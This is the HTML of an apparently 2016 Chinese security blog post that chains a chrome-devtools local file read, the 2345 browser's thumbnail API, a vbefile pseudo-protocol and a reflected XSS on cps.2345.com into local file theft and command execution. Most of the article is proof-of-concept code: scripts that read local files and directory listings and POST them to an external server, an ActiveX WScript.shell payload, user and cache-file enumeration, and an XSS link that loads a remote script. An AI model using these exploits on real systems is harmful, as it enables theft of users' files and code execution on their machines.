@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="x-man" />
+
+
+
+<meta name="description" content="本文讲述了如何利用浏览器漏洞来读取本地文件，进而实现命令执行，弹出计算机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浏览器本地文件读取及远程命令执行">
+<meta property="og:url" content="http://yoursite.com/2016/10/14/浏览器本地文件读取及远程命令执行/index.html">
+<meta property="og:site_name" content="x-man's blog">
+<meta property="og:description" content="本文讲述了如何利用浏览器漏洞来读取本地文件，进而实现命令执行，弹出计算机">
+<meta property="og:image" content="http://yoursite.com/img/browser-security/1.png">
+<meta property="og:image" content="http://yoursite.com/img/browser-security/2.jpg">
+<meta property="og:updated_time" content="2016-10-14T09:20:42.334Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="浏览器本地文件读取及远程命令执行">
+<meta name="twitter:description" content="本文讲述了如何利用浏览器漏洞来读取本地文件，进而实现命令执行，弹出计算机">
+<meta name="twitter:image" content="http://yoursite.com/img/browser-security/1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="x-man&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>浏览器本地文件读取及远程命令执行 | x-man&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">x-man</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">为伊消得人憔悴</p>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ajax/">Ajax</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nginx/">Nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XMLHttpRequest/">XMLHttpRequest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/baidu/">baidu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ichunqiu/">ichunqiu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechall/">wechall</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/浏览器安全/">浏览器安全</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于web安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">x-man</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">x-man</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">为伊消得人憔悴</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-浏览器本地文件读取及远程命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/10/14/浏览器本地文件读取及远程命令执行/" class="article-date">
+      <time datetime="2016-10-14T08:05:03.000Z" itemprop="datePublished">2016-10-14</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      浏览器本地文件读取及远程命令执行
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/浏览器安全/">浏览器安全</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h2><h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h4 id="0x00-chrome-devtools本地文件读取漏洞"><a href="#0x00-chrome-devtools本地文件读取漏洞" class="headerlink" title="0x00 chrome-devtools本地文件读取漏洞"></a>0x00 chrome-devtools本地文件读取漏洞</h4><p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2016-0204520" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2016-0204520</a><br>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0176314" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0176314</a> 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL<br>就会加载并执行xxx.com下的screencast_module.js，在这个js中，有权限使用DevToolsAPI，利用向外出容器发送类型为loadNetworkResource的消息可以读取到本地文件内容。<br>screencast_module.js 代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> data = <span class="string">""</span>;</div><div class="line">DevToolsAPI.streamWrite = <span class="function"><span class="keyword">function</span>(<span class="params">id, chunk</span>) </span>&#123;</div><div class="line">    <span class="built_in">document</span>.write(<span class="string">"Receiving data for stream "</span> + id + <span class="string">"&lt;br&gt;"</span>);</div><div class="line">    data += chunk;</div><div class="line">&#125;</div><div class="line">DevToolsAPI.sendMessageToEmbedder(</div><div class="line">    <span class="string">"loadNetworkResource"</span>,</div><div class="line">    [ <span class="string">"file:///C:/111.txt"</span>, <span class="string">""</span>, <span class="number">0</span> ],</div><div class="line">    <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> x=<span class="keyword">new</span> XMLHttpRequest();x.open(<span class="string">"POST"</span>,<span class="string">"https://**.**.**.**"</span>,<span class="literal">true</span>);x.send(data);  <span class="comment">//程序会把读到的文件内容发送到此链接指向的服务器，接收即可</span></div><div class="line">    &#125;</div><div class="line">);</div></pre></td></tr></table></figure></p>
+<p><img src="/img/browser-security/1.png" alt=""><br>不仅仅是读文件内容，利用这个，还可以读取目录下的文件列表，像这样<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> data = <span class="string">""</span>;</div><div class="line">DevToolsAPI.streamWrite = <span class="function"><span class="keyword">function</span>(<span class="params">id, chunk</span>) </span>&#123;</div><div class="line">    <span class="built_in">document</span>.write(<span class="string">"Receiving data for stream "</span> + id + <span class="string">"&lt;br&gt;"</span>);</div><div class="line">    data += chunk;</div><div class="line">&#125;</div><div class="line">DevToolsAPI.sendMessageToEmbedder(</div><div class="line">    <span class="string">"loadNetworkResource"</span>,</div><div class="line">    [ <span class="string">"file:///C:/"</span>, <span class="string">""</span>, <span class="number">0</span> ],</div><div class="line">    <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> x=<span class="keyword">new</span> XMLHttpRequest();x.open(<span class="string">"POST"</span>,<span class="string">"https://**.**.**.**"</span>,<span class="literal">true</span>);x.send(data);</div><div class="line">    &#125;</div><div class="line">);</div></pre></td></tr></table></figure></p>
+<h4 id="0x01-WebKit系浏览器伪协议调用"><a href="#0x01-WebKit系浏览器伪协议调用" class="headerlink" title="0x01 WebKit系浏览器伪协议调用"></a>0x01 WebKit系浏览器伪协议调用</h4><p>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0175902" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0175902</a> 中，可以通过location.href=”vbefile:/../../../已知路径/1.js”来执行本地文件1.js<br><img src="/img/browser-security/2.jpg" alt=""></p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>a. 访问<a href="http://**.**.**.**/test/all/cache.php，让浏览器生成一个恶意的缓存文件" target="_blank" rel="external">http://**.**.**.**/test/all/cache.php，让浏览器生成一个恶意的缓存文件</a><br>b. 通过上面的文件读取，读取c:/users/下的用户名列表，找到当前用户的用户名<br>c. 得到浏览器的缓存目录C:\Users\用户名\AppData\Local\Tencent\QQBrowser\User Data\Default\Cache<br>d. 通过上面的文件读取，得到缓存目录下的文件列表，得到浏览器刚生成的缓存文件名称<br>e. 通过 location.href=’vbefile:/../../../../../../../../../../Users/用户名/AppData/Local/Tencent/QQBrowser/User Data/Default/Cache/缓存文件名” //E:jscript //B “‘ 来执行恶意缓存文件</p>
+<h1 id="一步一步构造PoC"><a href="#一步一步构造PoC" class="headerlink" title="一步一步构造PoC"></a>一步一步构造PoC</h1><h4 id="0x00-2345浏览器当访问的文件大约20k时，会缓存文件到缓存目录"><a href="#0x00-2345浏览器当访问的文件大约20k时，会缓存文件到缓存目录" class="headerlink" title="0x00 2345浏览器当访问的文件大约20k时，会缓存文件到缓存目录"></a>0x00 2345浏览器当访问的文件大约20k时，会缓存文件到缓存目录</h4><p>构造文件，内容为<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var r=new ActiveXObject("WScript.shell");</div><div class="line">            r.run("calc");/*</div><div class="line">AAAAAAA*/      //填充大量的A使得文件大小足够大</div></pre></td></tr></table></figure></p>
+<p>构造链接让用户点击，用户访问该文件时，浏览器会缓存此文件</p>
+<h4 id="0x01-获得用户名"><a href="#0x01-获得用户名" class="headerlink" title="0x01 获得用户名"></a>0x01 获得用户名</h4><p>利用上面的本地文件读取漏洞，读取用户名,<br>screencast_module.js 代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> data = <span class="string">""</span>;</div><div class="line">DevToolsAPI.streamWrite = <span class="function"><span class="keyword">function</span>(<span class="params">id, chunk</span>) </span>&#123;</div><div class="line">    <span class="built_in">document</span>.write(<span class="string">"Receiving data for stream "</span> + id + <span class="string">"&lt;br&gt;"</span>);</div><div class="line">    data += chunk;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsers</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    DevToolsAPI.sendMessageToEmbedder(</div><div class="line">        <span class="string">"loadNetworkResource"</span>,</div><div class="line">        [ <span class="string">"file:///C:/Users"</span>, <span class="string">""</span>, <span class="number">0</span> ],</div><div class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> users=data.match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/g</span>)||[];</div><div class="line">            <span class="keyword">var</span> currentUser=[];</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;users.length;i++)&#123;</div><div class="line">                <span class="keyword">var</span> user=(users[i].match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/</span>)||[<span class="string">""</span>,<span class="string">""</span>])[<span class="number">1</span>]</div><div class="line">                <span class="keyword">if</span>([<span class="string">".."</span>,<span class="string">"All Users"</span>,<span class="string">"Default"</span>,<span class="string">"Default User"</span>,<span class="string">"Public"</span>,<span class="string">"UpdatusUser"</span>,<span class="string">"desktop.ini"</span>].indexOf(user)==<span class="number">-1</span>)&#123;</div><div class="line">                    currentUser.push(user); </div><div class="line">                &#125;				</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">console</span>.log(currentUser);</div><div class="line">        &#125;</div><div class="line">    );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="0x02-获得缓存文件名"><a href="#0x02-获得缓存文件名" class="headerlink" title="0x02 获得缓存文件名"></a>0x02 获得缓存文件名</h4><p>利用上面的本地文件读取漏洞，读取缓存文件名,<br>screencast_module.js 代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> data = <span class="string">""</span>;</div><div class="line">DevToolsAPI.streamWrite = <span class="function"><span class="keyword">function</span>(<span class="params">id, chunk</span>) </span>&#123;</div><div class="line">    <span class="built_in">document</span>.write(<span class="string">"Receiving data for stream "</span> + id + <span class="string">"&lt;br&gt;"</span>);</div><div class="line">    data += chunk;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCaches</span>(<span class="params">User</span>)</span>&#123;</div><div class="line">    DevToolsAPI.sendMessageToEmbedder(</div><div class="line">        <span class="string">"loadNetworkResource"</span>,</div><div class="line">        [ <span class="string">"file:///C:/Users/"</span>+User+<span class="string">"/AppData/Local/Tencent/QQBrowser/User Data/Default/Cache/"</span>, <span class="string">""</span>, <span class="number">0</span> ],</div><div class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</div><div class="line">            <span class="comment">//console.log(data);</span></div><div class="line">            <span class="keyword">var</span> cachesData=data.match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/g</span>)||[];</div><div class="line">            <span class="built_in">console</span>.log(cachesData.length);</div><div class="line">            <span class="keyword">var</span> caches=[];</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;cachesData.length;i++)&#123;</div><div class="line">                <span class="keyword">var</span> cache=(cachesData[i].match(<span class="regexp">/&lt;script&gt;addRow\("([^"]+)"/</span>)||[<span class="string">""</span>,<span class="string">""</span>])[<span class="number">1</span>]</div><div class="line">                <span class="keyword">if</span>(cache!=<span class="string">".."</span>)&#123;</div><div class="line">                    caches.push(cache);</div></pre></td></tr></table></figure></p>
+<h4 id="0x03-执行缓存文件"><a href="#0x03-执行缓存文件" class="headerlink" title="0x03 执行缓存文件"></a>0x03 执行缓存文件</h4><p>构造文件：location.href=’vbefile:/../../../../../../../../../../Users/用户名/AppData/Local/Tencent/QQBrowser/User Data/Default/Cache/缓存文件名” //E:jscript //B “‘<br>让用户访问此文件，便可执行缓存文件中的js，来弹出计算器</p>
+<h1 id="问题：如何让用户打开chrome-devtools"><a href="#问题：如何让用户打开chrome-devtools" class="headerlink" title="问题：如何让用户打开chrome-devtools://"></a>问题：如何让用户打开chrome-devtools://</h1><h4 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 问题"></a>0x00 问题</h4><p>要让用户自己主动打开：chrome-devtools://devtools/bundled/inspector.html?remoteBase=<a href="http://x.xx.com/file/&amp;remoteFrontend=true貌似不太可能，如@gainover提到的，location.href，window.open进行跳转都是会因为安全问题而被浏览器限制，比如：提示Not" target="_blank" rel="external">http://x.xx.com/file/&amp;remoteFrontend=true貌似不太可能，如@gainover提到的，location.href，window.open进行跳转都是会因为安全问题而被浏览器限制，比如：提示Not</a> allowed to load local resource，或打开页面是空白等措施。</p>
+<h4 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h4><p>找cps.2345.com域名下的XSS，利用xss加载/file/xss.js，执行chrome.ntp2345.prepareThumbnail(url)访问chrome-devtools:页面，读取本地文件并上传。</p>
+<h4 id="0x02-国产浏览器的毛病"><a href="#0x02-国产浏览器的毛病" class="headerlink" title="0x02 国产浏览器的毛病"></a>0x02 国产浏览器的毛病</h4><p>在很多基于Chromium进行开发的国产浏览器中，厂商都会加入一些自己定制的API来实现一些特定的功能。在2345浏览器中，我发现一个API：chrome.ntp2345.prepareThumbnail，根据名字猜测，这个API应该是用于获取指定URL的HTML页面的截图，也就是说会先访问页面，然后渲染生成缩略图。（因为之前在一个开源项目中实现过类似功能，所以看到这个比较敏感）。进行了尝试之后，发现果然可以执行，并且服务端接收到了发送上来的文件内容，完美地绕过了安全限制！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chrome.ntp2345.prepareThumbnail(&apos;chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true&apos;)</div></pre></td></tr></table></figure></p>
+<h4 id="0x03-XSS来帮忙"><a href="#0x03-XSS来帮忙" class="headerlink" title="0x03 XSS来帮忙"></a>0x03 XSS来帮忙</h4><p>发现上面的API之后，我里面写了一个页面进行测试，发现还是有一定的限制，那就是这个API在非2345.com及其子域名下执行的话，会直接返回2并且不会访问制定的URL。怎么办？我们来找个XSS不就绕过了？这里有点幸运，我Google了一下site:2345.com inurl:url就找到了一个使用js进行url跳转的XSS，原理类似于@phith0n的<a href="http://wooyun.org/bugs/wooyun-2016-0179329" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2016-0179329</a> ，不受chrome限制的XSSAuditor一个反射型XSS。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:alert(document.domain);//</div></pre></td></tr></table></figure></p>
+<h4 id="0x04-本地文件读取PoC"><a href="#0x04-本地文件读取PoC" class="headerlink" title="0x04 本地文件读取PoC"></a>0x04 本地文件读取PoC</h4><p>用户点击一下URL，利用反射型xss执行js文件，js文件调用chrome.ntp2345.prepareThumbnail(url)访问chrome-devtools:页面，读取本地文件并上传。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/file/xss.js%27;document.body.appendChild(s);//</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/10/14/浏览器本地文件读取及远程命令执行/">浏览器本地文件读取及远程命令执行</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">x-man</a></p>
+        <p><span>发布时间:</span>2016-10-14, 16:05:03</p>
+        <p><span>最后更新:</span>2016-10-14, 17:20:42</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/10/14/浏览器本地文件读取及远程命令执行/" title="浏览器本地文件读取及远程命令执行">http://yoursite.com/2016/10/14/浏览器本地文件读取及远程命令执行/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/10/14/浏览器本地文件读取及远程命令执行/　　作者: x-man" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/10/14/baidu-CTF-10月-第一场/">
+                    baidu-CTF-10月-第一场
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#浏览器安全"><span class="toc-number">1.</span> <span class="toc-text">浏览器安全</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#背景知识"><span class="toc-number"></span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-chrome-devtools本地文件读取漏洞"><span class="toc-number">0.0.1.</span> <span class="toc-text">0x00 chrome-devtools本地文件读取漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-WebKit系浏览器伪协议调用"><span class="toc-number">0.0.2.</span> <span class="toc-text">0x01 WebKit系浏览器伪协议调用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#思路"><span class="toc-number"></span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一步一步构造PoC"><span class="toc-number"></span> <span class="toc-text">一步一步构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-2345浏览器当访问的文件大约20k时，会缓存文件到缓存目录"><span class="toc-number">0.0.1.</span> <span class="toc-text">0x00 2345浏览器当访问的文件大约20k时，会缓存文件到缓存目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-获得用户名"><span class="toc-number">0.0.2.</span> <span class="toc-text">0x01 获得用户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-获得缓存文件名"><span class="toc-number">0.0.3.</span> <span class="toc-text">0x02 获得缓存文件名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-执行缓存文件"><span class="toc-number">0.0.4.</span> <span class="toc-text">0x03 执行缓存文件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#问题：如何让用户打开chrome-devtools"><span class="toc-number"></span> <span class="toc-text">问题：如何让用户打开chrome-devtools://</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-问题"><span class="toc-number">0.0.1.</span> <span class="toc-text">0x00 问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-思路"><span class="toc-number">0.0.2.</span> <span class="toc-text">0x01 思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-国产浏览器的毛病"><span class="toc-number">0.0.3.</span> <span class="toc-text">0x02 国产浏览器的毛病</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-XSS来帮忙"><span class="toc-number">0.0.4.</span> <span class="toc-text">0x03 XSS来帮忙</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-本地文件读取PoC"><span class="toc-number">0.0.5.</span> <span class="toc-text">0x04 本地文件读取PoC</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"浏览器本地文件读取及远程命令执行　| x-man's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
